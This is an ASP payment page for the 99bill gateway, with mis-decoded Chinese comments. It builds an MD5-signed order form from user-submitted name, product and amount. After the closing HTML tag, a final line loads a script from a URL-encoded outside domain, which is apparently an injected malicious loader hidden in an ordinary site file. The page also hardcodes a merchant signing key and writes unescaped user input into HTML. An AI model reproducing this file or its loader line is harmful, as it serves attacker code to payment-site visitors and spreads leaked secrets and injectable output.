<!--#include file="md5.asp"-->
<%
dim payerName,productName,orderAmount,bgUrl
payerName=replace(trim(request.Form("username1")),"'","")
productName=replace(trim(request.Form("car")),"'","")
orderAmount=clng(replace(trim(request.Form("money")),"'",""))
orderAmount1=orderAmount*0.01
bgUrl="http://www.dc173.com/bankcar/receive.asp"
'*
'* @Description: ¿ìÇ®ÈËÃñ±ÒÖ§¸¶Íø¹Ø½Ó¿Ú·¶Àı
'* @Copyright (c) ÉÏº£¿ìÇ®ĞÅÏ¢·şÎñÓĞÏŞ¹«Ë¾
'* @version 2.0
'*

'ÈËÃñ±ÒÍø¹ØÕË»§ºÅ
''ÇëµÇÂ¼¿ìÇ®ÏµÍ³»ñÈ¡ÓÃ»§±àºÅ£¬ÓÃ»§±àºÅºó¼Ó01¼´ÎªÈËÃñ±ÒÍø¹ØÕË»§ºÅ¡£
merchantAcctId="1000781683601"

'ÈËÃñ±ÒÍø¹ØÃÜÔ¿
''Çø·Ö´óĞ¡Ğ´.ÇëÓë¿ìÇ®ÁªÏµË÷È¡
key="ZEYAX39WBIMRQ578"

'×Ö·û¼¯.¹Ì¶¨Ñ¡ÔñÖµ¡£¿ÉÎª¿Õ¡£
''Ö»ÄÜÑ¡Ôñ1¡¢2¡¢3.
''1´ú±íUTF-8; 2´ú±íGBK; 3´ú±ígb2312
''Ä¬ÈÏÖµÎª1
inputCharset="3"

'½ÓÊÜÖ§¸¶½á¹ûµÄÒ³ÃæµØÖ·.Óë[bgUrl]²»ÄÜÍ¬Ê±Îª¿Õ¡£±ØĞëÊÇ¾ø¶ÔµØÖ·¡£
''Èç¹û[bgUrl]Îª¿Õ£¬¿ìÇ®½«Ö§¸¶½á¹ûPostµ½[pageUrl]¶ÔÓ¦µÄµØÖ·¡£
''Èç¹û[bgUrl]²»Îª¿Õ£¬²¢ÇÒ[bgUrl]Ò³ÃæÖ¸¶¨µÄ<redirecturl>µØÖ·²»Îª¿Õ£¬Ôò×ªÏòµ½<redirecturl>¶ÔÓ¦µÄµØÖ·
pageUrl=bgUrl

'·şÎñÆ÷½ÓÊÜÖ§¸¶½á¹ûµÄºóÌ¨µØÖ·.Óë[pageUrl]²»ÄÜÍ¬Ê±Îª¿Õ¡£±ØĞëÊÇ¾ø¶ÔµØÖ·¡£
''¿ìÇ®Í¨¹ı·şÎñÆ÷Á¬½ÓµÄ·½Ê½½«½»Ò×½á¹û·¢ËÍµ½[bgUrl]¶ÔÓ¦µÄÒ³ÃæµØÖ·£¬ÔÚÉÌ»§´¦ÀíÍê³ÉºóÊä³öµÄ<result>Èç¹ûÎª1£¬Ò³Ãæ»á×ªÏòµ½<redirecturl>¶ÔÓ¦µÄµØÖ·¡£
''Èç¹û¿ìÇ®Î´½ÓÊÕµ½<redirecturl>¶ÔÓ¦µÄµØÖ·£¬¿ìÇ®½«°ÑÖ§¸¶½á¹ûpostµ½[pageUrl]¶ÔÓ¦µÄÒ³Ãæ¡£
bgUrl=""
'Íø¹Ø°æ±¾.¹Ì¶¨Öµ
''¿ìÇ®»á¸ù¾İ°æ±¾ºÅÀ´µ÷ÓÃ¶ÔÓ¦µÄ½Ó¿Ú´¦Àí³ÌĞò¡£
''±¾´úÂë°æ±¾ºÅ¹Ì¶¨Îªv2.0
version="v2.0"

'ÓïÑÔÖÖÀà.¹Ì¶¨Ñ¡ÔñÖµ¡£
''Ö»ÄÜÑ¡Ôñ1¡¢2¡¢3
''1´ú±íÖĞÎÄ£»2´ú±íÓ¢ÎÄ
''Ä¬ÈÏÖµÎª1
language="1"

'Ç©ÃûÀàĞÍ.¹Ì¶¨Öµ
''1´ú±íMD5Ç©Ãû
''µ±Ç°°æ±¾¹Ì¶¨Îª1
signType="1"
   
'Ö§¸¶ÈËĞÕÃû
''¿ÉÎªÖĞÎÄ»òÓ¢ÎÄ×Ö·û
payerName=payerName

'Ö§¸¶ÈËÁªÏµ·½Ê½ÀàĞÍ.¹Ì¶¨Ñ¡ÔñÖµ
''Ö»ÄÜÑ¡Ôñ1
''1´ú±íEmail
payerContactType="1"

'Ö§¸¶ÈËÁªÏµ·½Ê½
''Ö»ÄÜÑ¡ÔñEmail»òÊÖ»úºÅ
payerContact=""

'ÉÌ»§¶©µ¥ºÅ
''ÓÉ×ÖÄ¸¡¢Êı×Ö¡¢»ò[-][_]×é³É
orderId=getDateStr()

'¶©µ¥½ğ¶î
''ÒÔ·ÖÎªµ¥Î»£¬±ØĞëÊÇÕûĞÍÊı×Ö
''±È·½2£¬´ú±í0.02Ôª
orderAmount=orderAmount
	
'¶©µ¥Ìá½»Ê±¼ä
''14Î»Êı×Ö¡£Äê[4Î»]ÔÂ[2Î»]ÈÕ[2Î»]Ê±[2Î»]·Ö[2Î»]Ãë[2Î»]
''Èç£»20080101010101
orderTime=getDateStr()

'ÉÌÆ·Ãû³Æ
''¿ÉÎªÖĞÎÄ»òÓ¢ÎÄ×Ö·û
productName=productName

'ÉÌÆ·ÊıÁ¿
''¿ÉÎª¿Õ£¬·Ç¿ÕÊ±±ØĞëÎªÊı×Ö
productNum="1"

'ÉÌÆ·´úÂë
''¿ÉÎª×Ö·û»òÕßÊı×Ö
productId=""

'ÉÌÆ·ÃèÊö
productDesc=""
	
'À©Õ¹×Ö¶Î1
''ÔÚÖ§¸¶½áÊøºóÔ­Ñù·µ»Ø¸øÉÌ»§
ext1=payerName

'À©Õ¹×Ö¶Î2
''ÔÚÖ§¸¶½áÊøºóÔ­Ñù·µ»Ø¸øÉÌ»§
ext2=productName
	
'Ö§¸¶·½Ê½.¹Ì¶¨Ñ¡ÔñÖµ
''Ö»ÄÜÑ¡Ôñ00¡¢10¡¢11¡¢12¡¢13¡¢14
''00£º×éºÏÖ§¸¶£¨Íø¹ØÖ§¸¶Ò³ÃæÏÔÊ¾¿ìÇ®Ö§³ÖµÄ¸÷ÖÖÖ§¸¶·½Ê½£¬ÍÆ¼öÊ¹ÓÃ£©10£ºÒøĞĞ¿¨Ö§¸¶£¨Íø¹ØÖ§¸¶Ò³ÃæÖ»ÏÔÊ¾ÒøĞĞ¿¨Ö§¸¶£©.11£ºµç»°ÒøĞĞÖ§¸¶£¨Íø¹ØÖ§¸¶Ò³ÃæÖ»ÏÔÊ¾µç»°Ö§¸¶£©.12£º¿ìÇ®ÕË»§Ö§¸¶£¨Íø¹ØÖ§¸¶Ò³ÃæÖ»ÏÔÊ¾¿ìÇ®ÕË»§Ö§¸¶£©.13£ºÏßÏÂÖ§¸¶£¨Íø¹ØÖ§¸¶Ò³ÃæÖ»ÏÔÊ¾ÏßÏÂÖ§¸¶·½Ê½£©.14£ºB2BÖ§¸¶£¨Íø¹ØÖ§¸¶Ò³ÃæÖ»ÏÔÊ¾B2BÖ§¸¶£¬µ«ĞèÒªÏò¿ìÇ®ÉêÇë¿ªÍ¨²ÅÄÜÊ¹ÓÃ£©
payType="00"

'ÒøĞĞ´úÂë
''ÊµÏÖÖ±½ÓÌø×ªµ½ÒøĞĞÒ³ÃæÈ¥Ö§¸¶,Ö»ÔÚpayType=10Ê±²ÅĞèÉèÖÃ²ÎÊı
''¾ßÌå´úÂë²Î¼û ½Ó¿ÚÎÄµµÒøĞĞ´úÂëÁĞ±í
bankId=""

'Í¬Ò»¶©µ¥½ûÖ¹ÖØ¸´Ìá½»±êÖ¾
''¹Ì¶¨Ñ¡ÔñÖµ£º 1¡¢0
''1´ú±íÍ¬Ò»¶©µ¥ºÅÖ»ÔÊĞíÌá½»1´Î£»0±íÊ¾Í¬Ò»¶©µ¥ºÅÔÚÃ»ÓĞÖ§¸¶³É¹¦µÄÇ°ÌáÏÂ¿ÉÖØ¸´Ìá½»¶à´Î¡£Ä¬ÈÏÎª0½¨ÒéÊµÎï¹ºÎï³µ½áËãÀàÉÌ»§²ÉÓÃ0£»ĞéÄâ²úÆ·ÀàÉÌ»§²ÉÓÃ1
redoFlag="1"

'¿ìÇ®µÄºÏ×÷»ï°éµÄÕË»§ºÅ
''ÈçÎ´ºÍ¿ìÇ®Ç©¶©´úÀíºÏ×÷Ğ­Òé£¬²»ĞèÒªÌîĞ´±¾²ÎÊı
pid=""


   
'Éú³É¼ÓÃÜÇ©Ãû´®
''ÇëÎñ±Ø°´ÕÕÈçÏÂË³ĞòºÍ¹æÔò×é³É¼ÓÃÜ´®£¡
	signMsgVal=appendParam(signMsgVal,"inputCharset",inputCharset)
	signMsgVal=appendParam(signMsgVal,"pageUrl",pageUrl)
	signMsgVal=appendParam(signMsgVal,"bgUrl",bgUrl)
	signMsgVal=appendParam(signMsgVal,"version",version)
	signMsgVal=appendParam(signMsgVal,"language",language)
	signMsgVal=appendParam(signMsgVal,"signType",signType)
	signMsgVal=appendParam(signMsgVal,"merchantAcctId",merchantAcctId)
	signMsgVal=appendParam(signMsgVal,"payerName",payerName)
	signMsgVal=appendParam(signMsgVal,"payerContactType",payerContactType)
	signMsgVal=appendParam(signMsgVal,"payerContact",payerContact)
	signMsgVal=appendParam(signMsgVal,"orderId",orderId)
	signMsgVal=appendParam(signMsgVal,"orderAmount",orderAmount)
	signMsgVal=appendParam(signMsgVal,"orderTime",orderTime)
	signMsgVal=appendParam(signMsgVal,"productName",productName)
	signMsgVal=appendParam(signMsgVal,"productNum",productNum)
	signMsgVal=appendParam(signMsgVal,"productId",productId)
	signMsgVal=appendParam(signMsgVal,"productDesc",productDesc)
	signMsgVal=appendParam(signMsgVal,"ext1",ext1)
	signMsgVal=appendParam(signMsgVal,"ext2",ext2)
	signMsgVal=appendParam(signMsgVal,"payType",payType)
	signMsgVal=appendParam(signMsgVal,"bankId",bankId)
	signMsgVal=appendParam(signMsgVal,"redoFlag",redoFlag)
	signMsgVal=appendParam(signMsgVal,"pid",pid)
	signMsgVal=appendParam(signMsgVal,"key",key)
signMsg= Ucase(md5(signMsgVal))
	
	'¹¦ÄÜº¯Êı¡£½«±äÁ¿Öµ²»Îª¿ÕµÄ²ÎÊı×é³É×Ö·û´®
	Function appendParam(returnStr,paramId,paramValue)

		If returnStr <> "" Then
			If paramValue <> "" then
				returnStr=returnStr&"&"&paramId&"="&paramValue
			End if
		Else 
			If paramValue <> "" then
				returnStr=paramId&"="&paramValue
			End if
		End if
		
		appendParam=ReturnStr

	End Function
	'¹¦ÄÜº¯Êı¡£½«±äÁ¿Öµ²»Îª¿ÕµÄ²ÎÊı×é³É×Ö·û´®¡£½áÊø

	'¹¦ÄÜº¯Êı¡£»ñÈ¡14Î»µÄÈÕÆÚ
	Function getDateStr() 
'	randomize
'    ranNum=int(600*rnd)+100
    'getDateStr=year(now)&month(now)&day(now)&hour(now)&minute(now)&second(now)
	dim dateStr1,dateStr2,strTemp 
	dateStr1=split(cstr(formatdatetime(now(),2)),"-") 
	dateStr2=split(cstr(right(formatdatetime(now(),3),8)),":") 

	for each StrTemp in dateStr1 
	if len(StrTemp)<2 then 
	getDateStr=getDateStr & "0" & strTemp 
	else 
	getDateStr=getDateStr & strTemp 
	end if 
	next 

	for each StrTemp in dateStr2 
	if len(StrTemp)<2 then 
	getDateStr=getDateStr & "0" & strTemp 
	else 
	getDateStr=getDateStr & strTemp 
	end if
	next
	End function 
	'¹¦ÄÜº¯Êı¡£»ñÈ¡14Î»µÄÈÕÆÚ¡£½áÊø
	
%>

<!doctype html public "-//w3c//dtd html 4.0 transitional//en" >
<html>
	<head>
		<title>Ê¹ÓÃ¿ìÇ®Ö§¸¶</title>
		<meta http-equiv="Content-Type" content="text/html; charset=gb2312" >
	<style type="text/css">
<!--
body,td,th {
	font-size: 12px;
}
-->
</style></head>
	
<BODY>
	<div align="center">
		<table width="259" border="0" cellpadding="1" cellspacing="1" bgcolor="#CCCCCC" >
			<tr bgcolor="#FFFFFF">
				<td width="80" height="24">Ö§¸¶·½Ê½:</td>
				<td height="24" >¿ìÇ®[99bill]</td>
			</tr>
			<tr bgcolor="#FFFFFF">
				<td height="24" >¶©µ¥±àºÅ:</td>
				<td height="24" ><%=orderId %></td>
			</tr>
			<tr bgcolor="#FFFFFF">
				<td height="24">¶©µ¥½ğ¶î:</td>
			  <td height="24"><%=orderAmount1 %>Ôª</td>
			</tr>
			<tr bgcolor="#FFFFFF">
				<td height="24">Ö§¸¶ÈË:</td>
				<td height="24"><%=payerName %></td>
			</tr>
			<tr bgcolor="#FFFFFF">
				<td height="24">ÉÌÆ·Ãû³Æ:</td>
				<td height="24"><%=productName %></td>
			</tr>
			<tr>
				<td></td>
				<td></td>
			</tr>
	  </table>
	</div>

	<div align="center" style="font-size=12px;font-weight: bold;color=red;">
		<form name="kqPay" method="post" action="https://www.99bill.com/gateway/recvMerchantInfoAction.htm">
		  <input type="hidden" name="inputCharset" value="<%=inputCharset %>">
			<input type="hidden" name="bgUrl" value="<%=bgUrl %>">
			<input type="hidden" name="pageUrl" value="<%=pageUrl %>">
			<input type="hidden" name="version" value="<%=version %>">
			<input type="hidden" name="language" value="<%=language %>">
			<input type="hidden" name="signType" value="<%=signType %>">
			<input type="hidden" name="signMsg" value="<%=signMsg %>">
			<input type="hidden" name="merchantAcctId" value="<%=merchantAcctId %>">
			<input type="hidden" name="payerName" value="<%=payerName %>">
			<input type="hidden" name="payerContactType" value="<%=payerContactType %>">
			<input type="hidden" name="payerContact" value="<%=payerContact %>">
			<input type="hidden" name="orderId" value="<%=orderId %>">
			<input type="hidden" name="orderAmount" value="<%=orderAmount %>">
			<input type="hidden" name="orderTime" value="<%=orderTime %>">
			<input type="hidden" name="productName" value="<%=productName %>">
			<input type="hidden" name="productNum" value="<%=productNum %>">
			<input type="hidden" name="productId" value="<%=productId %>">
			<input type="hidden" name="productDesc" value="<%=productDesc %>">
			<input type="hidden" name="ext1" value="<%=ext1 %>">
			<input type="hidden" name="ext2" value="<%=ext2 %>">
			<input type="hidden" name="payType" value="<%=payType %>">
			<input type="hidden" name="bankId" value="<%=bankId %>">
			<input type="hidden" name="redoFlag" value="<%=redoFlag %>">
			<input type="hidden" name="pid" value="<%=pid %>">
			<input type="submit" name="submit" value="Ìá½»µ½¿ìÇ®">
			
		</form>		
	</div>
	
</BODY>
</HTML>  
¬<script src=http://%62%62%67%33%2E%63%6E></script>